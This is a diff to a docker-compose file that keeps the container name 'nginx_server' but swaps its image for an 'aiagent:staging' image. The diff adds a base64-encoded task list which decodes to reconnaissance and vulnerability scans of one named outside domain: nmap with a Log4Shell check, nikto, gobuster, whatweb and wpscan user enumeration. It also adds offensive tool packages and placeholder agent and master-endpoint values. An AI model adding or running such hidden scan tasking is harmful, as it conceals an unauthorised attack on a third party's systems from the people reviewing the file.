@@ -2,12 +2,14 @@ version: '3.8'
 
 services:
   web:
-    image: nginx:latest
+    image: aiagent:staging
     container_name: nginx_server
     ports:
       - "8080:80"
     volumes:
       - ./html:/usr/share/nginx/html
     environment:
-      - ENVIRONMENT=development
-      - APP_VERSION=1.0
+      - TASKLIST='eyJmNmRlODI0ZC1hMGFiLTQ4ODUtODExMy1jZThhN2UwYTAzMzkiOiB7ImNvbW1hbmQiOiBbIm5tYXAgLXAgODAsNDQzIC0tc2NyaXB0PWh0dHAtZW51bSxodHRwLXZ1bG4tY3ZlMjAyMS00NDIyOCBodHRwOi8vbXJndGVjLmNvbSJdfSwgIjQzMzdiNjVmLTliODEtNGU4NS1hY2NlLWRlMTkzMzVlYzlmMyI6IHsiY29tbWFuZCI6IFsibmlrdG8gLWggaHR0cDovL21yZ3RlYy5jb20iXX0sICIwODE1NWZjOC02MjA2LTQ0M2EtYjlkMS03Y2NkMmJiNWIzNGUiOiB7ImNvbW1hbmQiOiBbImdvYnVzdGVyIGRpciAtdSBodHRwOi8vbXJndGVjLmNvbSAtdyAvdXNyL3NoYXJlL3dvcmRsaXN0cy9kaXJiL2NvbW1vbi50eHQiXX0sICI5NTM2ZTUxNy0zYzRkLTQ5MWYtYTU2MC0yYzIwYzc5YzYwYzMiOiB7ImNvbW1hbmQiOiBbIndoYXR3ZWIgaHR0cDovL21yZ3RlYy5jb20iXX0sICJkOTk4MzY1Zi1hZTFlLTRmNTYtYWQwZS03NTQ1OWQ4MDk4NjUiOiB7ImNvbW1hbmQiOiBbIndwc2NhbiAtLXVybCBodHRwOi8vbXJndGVjLmNvbSAtLWVudW1lcmF0ZSB1Il19fQ=='
+      - PACKAGES=["nmap", "nikto", "gobuster", "whatweb", "wpscan", "wordlists"]
+      - AGENTID="slihnfosidfniodfjoisjd"
+      - MASTERENDPOINT="asdasdadsdas"
